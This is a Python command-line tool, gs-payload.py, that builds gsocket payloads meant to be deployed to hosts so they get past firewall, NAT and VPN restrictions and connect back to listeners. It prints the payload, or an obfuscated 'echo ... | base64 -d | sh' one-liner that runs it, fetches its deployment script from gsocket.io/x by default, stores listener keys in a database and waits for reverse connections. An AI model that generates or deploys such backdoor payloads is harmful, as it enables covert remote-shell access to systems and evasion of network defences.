#!/usr/bin/env python

import os
import sys
import getopt
import string
import random
import base64
import datetime
from lib import generate, connect, db

Generate = True
Base64 = False
Connect = False
List = False
Key = ''
Add = False
Delete = False
Url = 'gsocket.io/x'

def usage():
  print('')
  print('Generate gsocket payloads to deploy to hosts in order to bypass firewall/NAT/VPN restrictions and connect to deployed listeners')
  print('Usage:')
  print('')
  print('-h   help       Prints this help message')
  print('-b   base64     Returns a base64 encoded version of the payload')
  print('-c   connect    Connect to a gsocket listener (If no key is provided one will be generated and client will wait)')
  print('-k   key        Key to the the endpoint you would like to connect to (Must be at least 8 characters)')
  print('-l   list       List all listeners in the database')
  print('-a   add        Add key of active listener to listener database (Key flag required)')
  print('-d   delete     Delete a key from listener database (Key flag required)')
  print('-u   url        Url hosting gsocket deployment script (Default gsocket.io/x)')
  print('')
  print('Example:')
  print('python gs-payload.py')
  print('python gs-payload.py -c -k 12Ab34Cd56Ef78Gh')
  print('python gs-payload.py -a -k 12Ab34Cd56Ef78Gh')
  print('python gs-payload.py -d -k 12Ab34Cd56Ef78Gh')

def main():
    global Generate
    global Base64
    global Connect
    global List
    global Key
    global Add
    global Delete
    global Url

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hbck:ladu:"', ['help', 'bae64', 'connect', 'key', 'list', 'add', 'delete', 'url'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit()

    for o,a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit()
        elif o in ('-b', '--base64'):
            Base64 = True
        elif o in ('-c', '--connect'):
            Connect = True
        elif o in ('-k', '--key'):
            Key = a
        elif o in ('-l', '--list'):
            List = True
            Generate = False
            Connect = False
        elif o in ('-a', '--add'):
            Add = True
            Generate = False
        elif o in ('-d', '--delete'):
            Delete = True
            Connect = False
            Generate = False
        elif o in ('-u', '--url'):
            Url = a

    if os.path.exists((os.path.expanduser('~') + '/.gs-payload/listeners.db')) == False:
        os.mkdir((os.path.expanduser('~') + '/.gs-payload'))
        db.db_create()
    else:
        pass

    if List == True:
        db.db_list()
        sys.exit()

    if Delete == True:
        db.db_delete(Key)
        sys.exit()

    if Add == True:
        if len(Key) < 8:
            print('[ - ] The key must be at least 8 characters')
            sys.exit()
        else:
            pass
        db.db_add(Key, datetime.datetime.now(), 'UNKNOWN', 'UNKNOWN')
    else:
        pass

    if len(Key) >= 8 and Connect == True:
        Generate = False
        print('[ + ] Attempting to connect to %s' % (Key))
        connect.gs_connect(Key)
    else:
        pass

    if Generate == True:
        if len(Key) != 0 and len(Key) < 8:
            print('[ - ] The key must be at least 8 characters! A new key is being generated')
            Key = str(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))
        elif len(Key) == 0:
            Key = str(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))
        else:
            pass
        payload = generate.generate(Key, Url)

        if Base64 == True:
            b64_payload = base64.urlsafe_b64encode(payload)
            print(str("echo " + "'" + b64_payload + "' | base64 -d | sh" ))
            if Connect == False:
                db.db_add(Key, datetime.datetime.now(), 'UNKNOWN', 'UNKNOWN')
                sys.exit()
            else:
                db.db_add(Key, datetime.datetime.now(), 'UNKNOWN', 'UNKNOWN')
                print('[ + ] Waiting for connection from %s' % (Key))
                connect.gs_reverse_connect(Key)
        else:
            print(str(payload))
            if Connect == False:
                db.db_add(Key, datetime.datetime.now(), 'UNKNOWN', 'UNKNOWN')
                sys.exit()
            else:
                db.db_add(Key, datetime.datetime.now(), 'UNKNOWN', 'UNKNOWN')
                print('[ + ] Waiting for connection from %s' % (Key))
                connect.gs_reverse_connect(Key)
    else:
        pass

main()
